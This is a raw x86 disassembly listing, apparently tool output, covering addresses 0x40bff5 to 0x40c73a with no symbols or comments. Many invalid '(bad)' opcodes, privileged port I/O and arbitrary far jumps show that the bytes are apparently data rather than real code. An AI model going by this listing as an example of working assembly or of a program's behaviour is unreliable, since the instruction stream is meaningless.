  40bff5:	jg     0x40bfda
  40bff7:	xchg   ebx,eax
  40bff8:	mov    dh,0x17
  40bffa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bffb:	ins    DWORD PTR es:[edi],dx
  40bffc:	and    DWORD PTR [eax],esp
  40bffe:	xchg   ebx,eax
  40bfff:	fidiv  WORD PTR [edx+ebp*1]
  40c002:	inc    esi
  40c003:	(bad)  
  40c004:	mov    ah,0x4b
  40c006:	ins    BYTE PTR es:[edi],dx
  40c007:	jmp    0x59bf:0xb5761b7
  40c00e:	xor    bh,BYTE PTR [edx-0x3b]
  40c011:	and    eax,0xf32ea464
  40c016:	xor    ebx,eax
  40c018:	mov    edx,0x9dae12c4
  40c01d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c01e:	pop    esi
  40c01f:	push   edx
  40c020:	jge    0x40c03c
  40c022:	idiv   al
  40c024:	stc    
  40c025:	push   esi
  40c026:	leave  
  40c027:	push   es
  40c028:	out    dx,al
  40c029:	or     al,0x89
  40c02b:	fsub   DWORD PTR [ecx-0x6df4cc0c]
  40c031:	mov    eax,ds:0x1c2dc811
  40c036:	(bad)  
  40c037:	popf   
  40c038:	jmp    0x40c0a8
  40c03a:	and    edx,DWORD PTR [ecx]
  40c03c:	bound  ecx,QWORD PTR [edi+ebx*8+0x5dbf25ca]
  40c043:	aas    
  40c044:	pop    ecx
  40c045:	mov    eax,ds:0x68723ba3
  40c04a:	pop    esp
  40c04b:	inc    edx
  40c04c:	nop
  40c04d:	mov    ds,WORD PTR [edi+0xe19142f]
  40c053:	dec    ecx
  40c054:	jp     0x40c09f
  40c056:	outs   dx,BYTE PTR ds:[esi]
  40c057:	mov    bl,0x4b
  40c059:	mov    eax,0x3de4f10c
  40c05e:	xchg   ebx,ebp
  40c060:	jnp    0x40c09c
  40c062:	jge    0x40c03c
  40c064:	push   edx
  40c065:	xor    BYTE PTR [eax],dl
  40c067:	dec    ebp
  40c068:	fs popa 
  40c06a:	ret    0x62e7
  40c06d:	ss xor al,0x31
  40c070:	xor    BYTE PTR [esi-0x35dd7b56],bh
  40c076:	mov    dl,0x79
  40c078:	retf   0xc255
  40c07b:	aam    0x52
  40c07d:	xchg   ecx,eax
  40c07e:	in     al,dx
  40c07f:	in     eax,0x94
  40c081:	rcr    BYTE PTR [esi-0x60],1
  40c084:	test   edi,edx
  40c086:	inc    ebp
  40c087:	sbb    DWORD PTR [ebx],ebp
  40c089:	arpl   WORD PTR ds:0x6ffc58a2,di
  40c08f:	inc    ebx
  40c090:	sbb    al,0xc7
  40c092:	aas    
  40c093:	lods   eax,DWORD PTR ds:[esi]
  40c094:	call   DWORD PTR [ebx]
  40c096:	sbb    al,0x26
  40c098:	mov    ah,0x97
  40c09a:	lods   al,BYTE PTR ds:[esi]
  40c09b:	clc    
  40c09c:	mov    ecx,0x75f2c4
  40c0a1:	fwait
  40c0a2:	cmp    BYTE PTR [ecx-0x4008fee7],cl
  40c0a8:	and    eax,0x57dd5f55
  40c0ad:	aaa    
  40c0ae:	push   0xac64c10d
  40c0b3:	aas    
  40c0b4:	int3   
  40c0b5:	sub    al,0x70
  40c0b7:	shl    ah,1
  40c0b9:	xor    cl,dl
  40c0bb:	test   DWORD PTR [ebx],ebp
  40c0bd:	clc    
  40c0be:	mov    edx,0x90a636bf
  40c0c3:	inc    esi
  40c0c4:	push   DWORD PTR [eax+0x25133731]
  40c0ca:	sub    eax,0xf2c5fb02
  40c0cf:	retf   0x7482
  40c0d2:	scas   eax,DWORD PTR es:[edi]
  40c0d3:	ss jns 0x40c14c
  40c0d6:	fstp   QWORD PTR ds:[ecx-0x24]
  40c0da:	popf   
  40c0db:	or     al,dl
  40c0dd:	mov    bl,0x9d
  40c0df:	fs xor al,0x34
  40c0e2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c0e3:	cmp    DWORD PTR [eax-0x39fbe8e5],ebx
  40c0e9:	adc    dl,BYTE PTR [ebp-0x3c]
  40c0ec:	xor    eax,0xa37aa1f4
  40c0f1:	or     al,0xd1
  40c0f3:	inc    ebp
  40c0f4:	push   0xffffff96
  40c0f6:	pop    ss
  40c0f7:	sbb    DWORD PTR [edx+0x49],esp
  40c0fa:	fwait
  40c0fb:	bound  ecx,QWORD PTR [ecx]
  40c0fd:	or     BYTE PTR [edx],cl
  40c0ff:	dec    esp
  40c100:	jb     0x40c083
  40c102:	jns    0x40c0fb
  40c104:	and    BYTE PTR [eax-0x7b],ah
  40c107:	push   0xffffffdb
  40c109:	mov    eax,0xa8effd96
  40c10e:	jp     0x40c0c4
  40c110:	fcom   QWORD PTR [esi-0x49]
  40c113:	push   ecx
  40c114:	(bad)  
  40c115:	sbb    eax,0x6715fad2
  40c11a:	out    0x16,al
  40c11c:	jg     0x40c0cb
  40c11e:	or     edi,DWORD PTR [ebx]
  40c120:	ins    DWORD PTR es:[edi],dx
  40c121:	push   ecx
  40c122:	jg     0x40c0a6
  40c124:	loopne 0x40c130
  40c126:	mov    WORD PTR [esi-0x73c97d18],cs
  40c12c:	shr    cl,0x6
  40c12f:	xor    esp,esp
  40c131:	dec    esp
  40c132:	mul    BYTE PTR cs:[edx]
  40c135:	pop    es
  40c136:	inc    eax
  40c137:	xchg   edx,eax
  40c138:	ins    DWORD PTR es:[edi],dx
  40c139:	call   0xf50e39c2
  40c13e:	inc    edx
  40c13f:	cwde   
  40c140:	cwde   
  40c141:	and    BYTE PTR [ebx-0x66b28abe],0xf9
  40c148:	(bad)  
  40c14a:	xchg   ebx,eax
  40c14b:	pop    esi
  40c14c:	fcomi  st,st(4)
  40c14e:	in     al,dx
  40c14f:	dec    esi
  40c150:	and    BYTE PTR ds:0x70223b24,bh
  40c156:	aad    0x86
  40c158:	psubb  mm6,mm5
  40c15b:	adc    edi,DWORD PTR [ecx+0x49d9c76]
  40c161:	ins    DWORD PTR es:[edi],dx
  40c162:	xor    DWORD PTR [eax],0x63a6e532
  40c168:	cli    
  40c169:	sbb    eax,0xbdd8b7de
  40c16e:	adc    al,0xb0
  40c170:	hlt    
  40c171:	xor    al,0xe2
  40c173:	fwait
  40c174:	xchg   edi,eax
  40c175:	arpl   WORD PTR [edx+eiz*4-0x47],ax
  40c179:	mov    ecx,0xfae8b8ad
  40c17e:	shl    BYTE PTR [edx+0x65a29bbf],1
  40c184:	jle    0x40c128
  40c186:	jg     0x40c14c
  40c188:	hlt    
  40c189:	push   0x8ad9c347
  40c18e:	pop    ds
  40c18f:	aas    
  40c190:	adc    eax,0xed4e57d0
  40c195:	popf   
  40c196:	push   esp
  40c197:	(bad)  
  40c198:	jmp    0x40c1f2
  40c19a:	or     ebx,DWORD PTR [edi+0x15]
  40c19d:	shl    BYTE PTR [ebx],cl
  40c19f:	in     al,dx
  40c1a0:	fiadd  WORD PTR [esi]
  40c1a2:	(bad)  
  40c1a3:	(bad)  
  40c1a4:	pushf  
  40c1a5:	jmp    0x40c1fd
  40c1a7:	nop
  40c1a8:	or     ecx,DWORD PTR [esp+ecx*2]
  40c1ab:	xchg   ebp,eax
  40c1ac:	test   DWORD PTR [edx+ebx*1],ecx
  40c1af:	cmp    al,0x0
  40c1b1:	loop   0x40c1f8
  40c1b3:	loop   0x40c1f9
  40c1b5:	les    esp,FWORD PTR [ebx]
  40c1b7:	int3   
  40c1b8:	aaa    
  40c1b9:	jb     0x40c17d
  40c1bb:	or     al,0x2
  40c1bd:	dec    ecx
  40c1be:	add    al,0xd6
  40c1c0:	inc    edx
  40c1c1:	sbb    BYTE PTR [esi],cl
  40c1c3:	xor    eax,DWORD PTR [edi-0x5d]
  40c1c6:	sub    eax,0xe7b95ac3
  40c1cb:	cdq    
  40c1cc:	ret    0x49cb
  40c1cf:	das    
  40c1d0:	pop    ebx
  40c1d1:	xchg   esi,eax
  40c1d2:	mov    ?,WORD PTR ss:0xbecdfef2
  40c1d9:	sub    BYTE PTR [esi+0x544b5f16],ch
  40c1df:	push   esp
  40c1e0:	or     DWORD PTR [ebp+0x69d3ba84],ebp
  40c1e6:	int3   
  40c1e7:	jmp    0xd394:0xd14eed66
  40c1ee:	popa   
  40c1ef:	and    dh,BYTE PTR [edx-0x48]
  40c1f2:	xor    al,0xa0
  40c1f4:	aaa    
  40c1f5:	sub    DWORD PTR [edx],esp
  40c1f7:	stos   BYTE PTR es:[edi],al
  40c1f8:	push   0x585c1b01
  40c1fd:	push   0x946d666d
  40c202:	test   bl,dl
  40c204:	jo     0x40c261
  40c206:	dec    edx
  40c207:	jle    0x40c1a6
  40c209:	push   es
  40c20a:	pop    esi
  40c20b:	cmp    esp,edx
  40c20d:	inc    ebp
  40c20e:	or     ah,cl
  40c210:	hlt    
  40c211:	ret    
  40c212:	loope  0x40c1f9
  40c214:	bound  esi,QWORD PTR [ebp-0x26]
  40c217:	popf   
  40c218:	mov    dh,0x38
  40c21a:	mov    ebp,0xba52ffe8
  40c21f:	call   0x412df93a
  40c224:	adc    esp,DWORD PTR [eax]
  40c226:	cmc    
  40c227:	faddp  st(2),st
  40c229:	(bad)  
  40c22a:	enter  0x9f5,0xe
  40c22e:	xchg   ecx,eax
  40c22f:	rol    dl,cl
  40c231:	push   eax
  40c232:	sbb    bl,BYTE PTR [esi-0x7]
  40c235:	jge    0x40c29f
  40c237:	mov    edx,0x7377896d
  40c23c:	push   cx
  40c23e:	mov    al,ds:0xecc90bf0
  40c243:	sbb    dl,BYTE PTR [ebx]
  40c245:	or     edx,ebp
  40c247:	sbb    BYTE PTR [eax+0x51329593],bl
  40c24d:	mov    esp,DWORD PTR [ebx+0x768af99f]
  40c253:	cmp    BYTE PTR [esi],0x3
  40c256:	outs   dx,BYTE PTR ds:[esi]
  40c257:	in     al,0x2b
  40c259:	mov    esi,0x6027e0e3
  40c25e:	xlat   BYTE PTR ds:[ebx]
  40c25f:	mov    dh,0xdd
  40c261:	inc    ebp
  40c262:	mov    ebx,0x7e795368
  40c267:	(bad)  
  40c268:	repz xchg esi,eax
  40c26a:	inc    ebp
  40c26b:	stos   BYTE PTR es:[edi],al
  40c26c:	pop    ecx
  40c26d:	ins    DWORD PTR es:[edi],dx
  40c26e:	lods   al,BYTE PTR ds:[esi]
  40c26f:	sub    BYTE PTR [eax-0x243ef796],dh
  40c275:	ret    
  40c276:	clc    
  40c277:	or     BYTE PTR [ebp-0x60],ah
  40c27a:	mov    eax,ds:0x24d91b6
  40c27f:	inc    ebx
  40c280:	or     eax,0xfd6e2718
  40c285:	imul   cl
  40c287:	hlt    
  40c288:	jnp    0x40c304
  40c28a:	hlt    
  40c28b:	sub    edi,DWORD PTR [edi]
  40c28d:	sbb    DWORD PTR ds:0xc1f8429d,ecx
  40c293:	push   di
  40c295:	add    al,0x63
  40c297:	mov    bh,0x94
  40c299:	adc    eax,0xdb75978a
  40c29e:	cs in  eax,0xfa
  40c2a1:	out    dx,eax
  40c2a2:	lods   al,BYTE PTR ds:[esi]
  40c2a3:	ins    BYTE PTR es:[edi],dx
  40c2a4:	sbb    DWORD PTR [eax+0x5a23fcc8],ebp
  40c2aa:	out    0x25,al
  40c2ac:	imul   ebx,DWORD PTR [eax+0x5d],0x3d
  40c2b0:	add    BYTE PTR [ebp+0x60],bh
  40c2b3:	rcr    dh,1
  40c2b5:	push   0x6cae0b2c
  40c2ba:	add    eax,0x13e6f877
  40c2bf:	hlt    
  40c2c0:	sbb    DWORD PTR [eax],0xffffffd5
  40c2c3:	loop   0x40c303
  40c2c5:	ret    0xe75a
  40c2c8:	mov    ebx,esi
  40c2ca:	rcl    BYTE PTR [edx+0x3931da92],0x33
  40c2d1:	int3   
  40c2d2:	pop    esp
  40c2d3:	mov    ah,0x52
  40c2d5:	fucom  st(4)
  40c2d7:	neg    BYTE PTR [edi]
  40c2d9:	jp     0x40c309
  40c2db:	out    0xb5,al
  40c2dd:	fst    DWORD PTR [edi]
  40c2df:	retf   
  40c2e0:	in     eax,0xee
  40c2e2:	sbb    eax,0xe6a5261a
  40c2e7:	push   ss
  40c2e8:	jns    0x40c2af
  40c2ea:	push   0xffffffa6
  40c2ec:	mov    ds:0x1ba34758,al
  40c2f1:	xchg   edx,eax
  40c2f2:	stos   DWORD PTR es:[edi],eax
  40c2f3:	mov    dh,0xf4
  40c2f5:	pop    es
  40c2f6:	repz (bad) [edx-0x129ee5d8]
  40c2fd:	mov    edx,edi
  40c2ff:	stos   DWORD PTR es:[edi],eax
  40c300:	dec    eax
  40c301:	sbb    esp,DWORD PTR [edi+0x1a7bd07c]
  40c307:	mov    ecx,0xdfe8ee37
  40c30c:	mov    eax,ds:0xa60f31a8
  40c311:	sar    DWORD PTR gs:[esp+ebx*8-0x603dd8ea],0x28
  40c31a:	cdq    
  40c31b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c31c:	sub    cl,dl
  40c31e:	mov    esi,0x11be2e63
  40c323:	gs loop 0x40c31f
  40c326:	mov    esi,0xc35738cb
  40c32b:	adc    eax,0x1e4d7549
  40c330:	pusha  
  40c331:	sar    DWORD PTR [ecx-0x4a1401fb],0xf8
  40c338:	or     bl,al
  40c33a:	bound  ecx,QWORD PTR [ecx]
  40c33c:	addr16 xchg ebp,eax
  40c33e:	xor    al,0xf8
  40c340:	scas   eax,DWORD PTR es:[edi]
  40c341:	(bad)  
  40c342:	repz into 
  40c344:	cmp    eax,0x459d3dff
  40c349:	sahf   
  40c34a:	data16 sahf 
  40c34c:	jmp    0x2593:0x3e5fc21
  40c353:	add    edx,DWORD PTR [esi]
  40c355:	mov    ah,0x64
  40c357:	loope  0x40c31c
  40c359:	in     eax,0x6a
  40c35b:	or     DWORD PTR [edx-0x34],esi
  40c35e:	mov    ds:0x5c3a2390,al
  40c363:	out    dx,eax
  40c364:	push   eax
  40c365:	add    eax,0x1d337b92
  40c36a:	or     cl,ah
  40c36c:	in     eax,0x80
  40c36e:	dec    ebp
  40c36f:	rcl    BYTE PTR [edx+ebx*4+0x1f8001a0],1
  40c376:	icebp  
  40c377:	loopne 0x40c3c7
  40c379:	in     eax,dx
  40c37a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c37b:	xor    eax,0xa3c9bcb8
  40c380:	aaa    
  40c381:	push   edx
  40c382:	lods   al,BYTE PTR ds:[esi]
  40c383:	mov    dl,0xd9
  40c385:	pop    edx
  40c386:	mov    BYTE PTR [ecx+0x4a],ch
  40c389:	ret    
  40c38a:	or     al,0xe8
  40c38c:	mul    DWORD PTR [ecx]
  40c38e:	fs repz dec ebx
  40c391:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c392:	aaa    
  40c393:	fdivr  QWORD PTR [ebx+0x58c5c7d0]
  40c399:	sar    eax,0xd1
  40c39c:	bound  ecx,QWORD PTR [edx]
  40c39e:	pop    edi
  40c39f:	push   eax
  40c3a0:	out    0x25,eax
  40c3a2:	add    al,0x30
  40c3a4:	hlt    
  40c3a5:	adc    BYTE PTR [ebx-0x6a86c3f],al
  40c3ab:	push   0x6463c272
  40c3b0:	xor    eax,DWORD PTR [edi+ebx*4-0x52449f4f]
  40c3b7:	repz adc DWORD PTR [ecx],esi
  40c3ba:	push   cs
  40c3bb:	rcl    ch,0x4b
  40c3be:	pop    ebx
  40c3bf:	mov    dh,0xce
  40c3c1:	cmp    edi,DWORD PTR [ecx-0xb]
  40c3c4:	stc    
  40c3c5:	fistp  DWORD PTR gs:[esi]
  40c3c8:	addr16 jnp 0x40c39a
  40c3cb:	test   dh,0x44
  40c3ce:	pop    ds
  40c3cf:	mov    cs,esp
  40c3d1:	push   ebx
  40c3d2:	jbe    0x40c3a0
  40c3d4:	loop   0x40c3b8
  40c3d6:	push   es
  40c3d7:	cmp    DWORD PTR [bx],eax
  40c3da:	jecxz  0x40c3a4
  40c3dc:	mov    al,0xe2
  40c3de:	das    
  40c3df:	pushf  
  40c3e0:	ins    BYTE PTR es:[edi],dx
  40c3e1:	cmp    ecx,ecx
  40c3e3:	pop    ss
  40c3e4:	and    eax,0x82c7925b
  40c3e9:	in     al,dx
  40c3ea:	neg    DWORD PTR [edx+0x1d215508]
  40c3f0:	sub    eax,0xe5337663
  40c3f5:	outs   dx,BYTE PTR ds:[esi]
  40c3f6:	sub    al,0xbf
  40c3f8:	iret   
  40c3f9:	(bad)  
  40c3fa:	imul   ebx,DWORD PTR [edi+0x78],0xe5640190
  40c401:	inc    ebp
  40c402:	jg     0x40c3ca
  40c404:	jge    0x40c43e
  40c406:	inc    esp
  40c407:	xchg   esi,eax
  40c408:	sti    
  40c409:	xchg   esi,eax
  40c40a:	aam    0xe4
  40c40c:	pop    esp
  40c40d:	mov    edx,0x5ce8e7ba
  40c412:	out    dx,eax
  40c413:	push   esi
  40c414:	push   0xba367793
  40c419:	fidivr WORD PTR ds:0x6077fdc7
  40c41f:	pop    esi
  40c420:	xchg   ebx,eax
  40c421:	out    0x4f,eax
  40c423:	adc    eax,0x67079ed2
  40c428:	mov    bh,0x86
  40c42a:	or     BYTE PTR [ecx],dl
  40c42c:	nop
  40c42d:	push   0x61
  40c42f:	or     edx,DWORD PTR [edi+edx*1-0x2401f7cd]
  40c436:	js     0x40c475
  40c438:	pop    ds
  40c439:	lods   eax,DWORD PTR ds:[esi]
  40c43a:	addr16 dec ecx
  40c43c:	pop    ebx
  40c43d:	mov    ch,0x64
  40c43f:	xor    BYTE PTR [edi],ch
  40c441:	out    dx,al
  40c442:	jle    0x40c3dc
  40c444:	imul   ebx,edi,0xd2a64d03
  40c44a:	pop    es
  40c44b:	repz sbb al,0xbe
  40c44e:	push   ebx
  40c44f:	(bad)  
  40c450:	sar    BYTE PTR [ebx+0x2da2bd61],0x52
  40c457:	aad    0xf8
  40c459:	pop    ds
  40c45a:	pop    ebx
  40c45b:	pop    esi
  40c45c:	fwait
  40c45d:	adc    eax,0x75ab1d6c
  40c462:	cmp    bl,BYTE PTR [edi+0x7b]
  40c465:	dec    ebx
  40c466:	jae    0x40c3f2
  40c468:	retf   0x22f3
  40c46b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c46c:	jge    0x40c4b2
  40c46e:	inc    esi
  40c46f:	and    DWORD PTR [edx],0x3
  40c472:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c473:	pop    esi
  40c474:	push   ds
  40c475:	xchg   edi,eax
  40c476:	pop    esi
  40c477:	push   cs
  40c478:	mov    dh,0xb0
  40c47a:	inc    esi
  40c47b:	stos   DWORD PTR es:[edi],eax
  40c47c:	pushf  
  40c47d:	pop    edx
  40c47e:	outs   dx,DWORD PTR ds:[esi]
  40c47f:	add    BYTE PTR [esi-0x65],al
  40c482:	jae    0x40c451
  40c484:	or     edi,DWORD PTR [ebp-0x46]
  40c487:	cmc    
  40c488:	pop    edi
  40c489:	cs jecxz 0x40c4c5
  40c48c:	push   edx
  40c48d:	fwait
  40c48e:	mov    edi,0xfec4fabf
  40c493:	fs scas al,BYTE PTR es:[edi]
  40c495:	adc    DWORD PTR [esi-0x1695984f],0x21c59099
  40c49f:	cmp    DWORD PTR [esi-0x37],0x4650f96b
  40c4a6:	test   al,0xcb
  40c4a8:	sbb    ch,dh
  40c4aa:	add    BYTE PTR [ebx],0x19
  40c4ad:	ds and al,0xac
  40c4b0:	and    eax,0xfb570745
  40c4b5:	loopne 0x40c4c9
  40c4b7:	stos   DWORD PTR es:[edi],eax
  40c4b8:	inc    ebx
  40c4b9:	xor    edi,0xbe6638e7
  40c4bf:	xchg   edi,eax
  40c4c0:	pop    ss
  40c4c1:	fs dec edi
  40c4c3:	mov    eax,0x11a5c3d3
  40c4c8:	sub    ecx,DWORD PTR [edx+0x7d]
  40c4cb:	retf   0xb3a0
  40c4ce:	mov    WORD PTR [esi+0x47],es
  40c4d1:	cmp    bl,BYTE PTR [esi+0x6881b94]
  40c4d7:	fld    DWORD PTR [edi]
  40c4d9:	mov    eax,0xda6d4cf2
  40c4de:	arpl   WORD PTR [edi+esi*8],si
  40c4e1:	sbb    DWORD PTR [edi+0x1d],ecx
  40c4e4:	dec    esp
  40c4e5:	mov    eax,0x9de82a36
  40c4ea:	and    ecx,DWORD PTR [ebx-0x6545fc74]
  40c4f0:	std    
  40c4f1:	ret    
  40c4f2:	xor    BYTE PTR [ebx-0x5ed603c5],0xda
  40c4f9:	mov    ebp,0x41a2caa
  40c4fe:	cmp    DWORD PTR [ebp+ebp*8+0x12],0x823bc72d
  40c506:	push   ebx
  40c507:	ja     0x40c4c7
  40c509:	out    dx,eax
  40c50a:	js     0x40c508
  40c50c:	sahf   
  40c50d:	sub    ah,BYTE PTR [esi+0x11026e04]
  40c513:	dec    esi
  40c514:	push   es
  40c515:	or     BYTE PTR [edx+0x30],bl
  40c518:	add    ebx,ebp
  40c51a:	xchg   ebx,eax
  40c51b:	or     edx,DWORD PTR [ebp+0x56]
  40c51e:	in     al,dx
  40c51f:	clc    
  40c520:	push   esp
  40c521:	dec    edi
  40c522:	retf   
  40c523:	das    
  40c524:	add    eax,0x4bb82b9c
  40c529:	dec    eax
  40c52a:	dec    DWORD PTR [esi+0x1617bfa5]
  40c530:	sbb    esp,edx
  40c532:	sub    edx,ebp
  40c534:	xadd   BYTE PTR [edx-0x6fbb8cab],dl
  40c53b:	inc    ebp
  40c53c:	xlat   BYTE PTR ds:[ebx]
  40c53d:	inc    edi
  40c53e:	lahf   
  40c53f:	repz jl 0x40c53a
  40c542:	dec    edx
  40c543:	pusha  
  40c544:	add    al,0x2f
  40c546:	scas   eax,DWORD PTR es:[edi]
  40c547:	push   cs
  40c548:	cli    
  40c549:	mov    ebx,0x70fa58a
  40c54e:	inc    edx
  40c54f:	inc    esp
  40c550:	xchg   ecx,eax
  40c551:	sub    eax,0x80c59c6f
  40c556:	popa   
  40c557:	(bad)  
  40c558:	in     eax,dx
  40c559:	mov    bh,0x65
  40c55b:	dec    edx
  40c55c:	enter  0x5b6d,0x74
  40c560:	js     0x40c56f
  40c562:	cmp    esi,ebx
  40c564:	ret    0xe581
  40c567:	adc    ah,BYTE PTR [ebp+0x44629b90]
  40c56d:	pop    ebx
  40c56e:	outs   dx,BYTE PTR ds:[esi]
  40c56f:	test   eax,0x9453277f
  40c574:	(bad)  
  40c575:	xchg   ebp,eax
  40c576:	jo     0x40c57c
  40c578:	test   ax,0x63ac
  40c57c:	hlt    
  40c57d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c57e:	ins    BYTE PTR es:[edi],dx
  40c57f:	and    esi,DWORD PTR [eax-0x3784f198]
  40c585:	push   ecx
  40c586:	rcr    bh,0x21
  40c589:	xchg   esp,eax
  40c58a:	jl     0x40c5a8
  40c58c:	and    eax,0xc076a30
  40c591:	ins    DWORD PTR es:[edi],dx
  40c592:	pop    ecx
  40c593:	shr    DWORD PTR [esi],cl
  40c595:	pop    es
  40c596:	cmp    esi,DWORD PTR [eax-0x5ac5bd5e]
  40c59c:	cwde   
  40c59d:	cli    
  40c59e:	sub    eax,0x64e7ce75
  40c5a3:	mov    ds:0xba7712b3,al
  40c5a8:	push   ebp
  40c5a9:	mov    dh,0x1d
  40c5ab:	enter  0xb9f4,0x1
  40c5af:	je     0x40c5b7
  40c5b1:	(bad)  
  40c5b3:	ds (bad) 
  40c5b5:	sbb    eax,0x1a391323
  40c5ba:	ja     0x40c637
  40c5bc:	mov    bl,0xf8
  40c5be:	and    eax,0x2508d177
  40c5c3:	ins    BYTE PTR es:[edi],dx
  40c5c4:	into   
  40c5c5:	mov    eax,0x6d2c1c3
  40c5ca:	or     ah,dl
  40c5cc:	neg    BYTE PTR [esi]
  40c5ce:	push   cs
  40c5cf:	(bad)  
  40c5d0:	out    dx,al
  40c5d1:	hlt    
  40c5d2:	pushf  
  40c5d3:	ins    BYTE PTR es:[edi],dx
  40c5d4:	int    0x99
  40c5d6:	jne    0x40c62f
  40c5d8:	xchg   esi,eax
  40c5d9:	stos   BYTE PTR es:[edi],al
  40c5da:	cdq    
  40c5db:	test   DWORD PTR [ebx+ebx*2-0x668c26de],0x553b875b
  40c5e6:	mov    al,0xcb
  40c5e8:	aaa    
  40c5e9:	arpl   bx,di
  40c5eb:	lods   eax,DWORD PTR ds:[esi]
  40c5ec:	and    al,0x12
  40c5ee:	mov    eax,0x4c20ae47
  40c5f3:	scas   al,BYTE PTR es:[edi]
  40c5f4:	pop    ebx
  40c5f5:	push   ds
  40c5f6:	xor    al,0x9
  40c5f8:	int3   
  40c5f9:	mov    ecx,0x65c9678b
  40c5fe:	lahf   
  40c5ff:	pop    esi
  40c600:	push   es
  40c601:	(bad)  
  40c602:	mov    esi,0xba0e067a
  40c607:	stos   DWORD PTR es:[edi],eax
  40c608:	mov    edi,0x6a09277c
  40c60d:	les    ecx,FWORD PTR [ebp+eiz*4-0x32]
  40c611:	(bad)  
  40c613:	sub    DWORD PTR [ecx],edi
  40c615:	mov    cl,0xe5
  40c617:	or     DWORD PTR [ebx-0x1d],ecx
  40c61a:	mov    al,ds:0x7bfeacd
  40c61f:	adc    BYTE PTR [edi-0x5b],dh
  40c622:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c623:	push   ss
  40c624:	dec    esi
  40c625:	loope  0x40c6a1
  40c627:	adc    edi,edi
  40c629:	fstp   QWORD PTR [eax+0x20e5107f]
  40c62f:	cmp    DWORD PTR [esi+0x1a],edi
  40c632:	mov    cl,0xad
  40c634:	adc    eax,ebx
  40c636:	popf   
  40c637:	mov    BYTE PTR [ebx+0xb],0x51
  40c63b:	retf   
  40c63c:	mov    dl,0xe8
  40c63e:	inc    ebp
  40c63f:	inc    esp
  40c640:	fisubr DWORD PTR [ecx+0x64]
  40c643:	int    0x8d
  40c645:	frstor [eax-0x59]
  40c648:	fldenv [ebp-0x59]
  40c64b:	rcr    BYTE PTR [ebx-0x573407f4],cl
  40c651:	mov    dl,0x4d
  40c653:	popa   
  40c654:	inc    esi
  40c655:	add    edx,edi
  40c657:	xchg   edi,eax
  40c658:	inc    ebx
  40c659:	punpckhbw mm4,QWORD PTR [edi]
  40c65c:	bound  esp,QWORD PTR [edx]
  40c65e:	stos   BYTE PTR es:[edi],al
  40c65f:	retf   
  40c660:	xor    al,0xeb
  40c662:	sbb    dl,0xff
  40c665:	test   eax,0xb5b04d91
  40c66a:	pop    ebx
  40c66b:	push   edi
  40c66c:	shl    DWORD PTR [ebx],0x1a
  40c66f:	xchg   edi,eax
  40c670:	(bad)  
  40c671:	fcomi  st,st(4)
  40c673:	scas   eax,DWORD PTR es:[edi]
  40c674:	jo     0x40c5fd
  40c676:	mov    ebx,0x61d19734
  40c67b:	mov    ecx,0xa6f32aec
  40c680:	int3   
  40c681:	sbb    eax,DWORD PTR [eax-0x5172ed8a]
  40c687:	jb     0x40c61a
  40c689:	push   ds
  40c68a:	mov    al,0x5d
  40c68c:	or     BYTE PTR [edx+0x5a],cl
  40c68f:	loope  0x40c656
  40c691:	fist   WORD PTR [eax+ebx*8+0x76252f1a]
  40c698:	add    ebp,esp
  40c69a:	enter  0x7230,0x3b
  40c69e:	outs   dx,DWORD PTR ds:[esi]
  40c69f:	jns    0x40c6be
  40c6a1:	xor    DWORD PTR [edx+0x4],ebp
  40c6a4:	cdq    
  40c6a5:	xor    al,0x40
  40c6a7:	lock je 0x40c70e
  40c6aa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c6ab:	jmp    FWORD PTR [esi]
  40c6ad:	push   0x9dcfbe1e
  40c6b2:	xor    al,0xd7
  40c6b4:	cld    
  40c6b5:	or     esi,DWORD PTR [edi+0x7baf4964]
  40c6bb:	(bad)  
  40c6bc:	dec    ecx
  40c6bd:	and    BYTE PTR [esi],bl
  40c6bf:	fadd   QWORD PTR [ebx]
  40c6c1:	or     al,0x21
  40c6c3:	inc    ebx
  40c6c4:	push   edi
  40c6c5:	inc    ecx
  40c6c6:	fsub   DWORD PTR [ebx+ebp*1]
  40c6c9:	xor    al,0x2d
  40c6cb:	test   DWORD PTR ds:0xe50b223a,0x4eb34512
  40c6d5:	std    
  40c6d6:	mov    dl,0x1a
  40c6d8:	sahf   
  40c6d9:	fsubr  QWORD PTR [eax]
  40c6db:	jnp    0x40c66a
  40c6dd:	into   
  40c6de:	mov    ds:0x28d30c0,al
  40c6e3:	pop    ss
  40c6e4:	mov    esp,?
  40c6e6:	adc    edx,edi
  40c6e8:	stos   BYTE PTR es:[edi],al
  40c6e9:	loope  0x40c6ed
  40c6eb:	lahf   
  40c6ec:	xor    DWORD PTR ds:0xbc9d3f14,edx
  40c6f2:	xor    dl,BYTE PTR [esi+0x2c]
  40c6f5:	fnstsw WORD PTR [ecx+0x7dabdb6f]
  40c6fb:	pop    ebp
  40c6fc:	inc    edx
  40c6fd:	pop    edx
  40c6fe:	cwde   
  40c6ff:	(bad)  
  40c700:	retf   
  40c701:	jno    0x40c747
  40c703:	lock stos DWORD PTR es:[di],eax
  40c706:	mov    WORD PTR [eax],fs
  40c708:	jmp    0x40c6e3
  40c70a:	add    BYTE PTR [edx+0xa],0xd7
  40c70e:	push   0x63709490
  40c713:	pop    ss
  40c714:	push   esp
  40c715:	(bad)  
  40c716:	hlt    
  40c717:	cmp    edi,ecx
  40c719:	mov    edi,0x7204be2f
  40c71e:	jb     0x40c715
  40c720:	ss inc esp
  40c722:	and    ch,BYTE PTR [edi+edi*1]
  40c725:	lods   al,BYTE PTR ds:[esi]
  40c726:	pop    es
  40c727:	lahf   
  40c728:	jns    0x40c70c
  40c72a:	inc    ecx
  40c72b:	rcr    BYTE PTR [ebp+0x59694da3],cl
  40c731:	out    dx,al
  40c732:	sbb    edx,DWORD PTR [ebp-0xfbeb73b]
  40c738:	add    DWORD PTR [edx],edx
  40c73a:	mov    ds:0x705b4340,eax
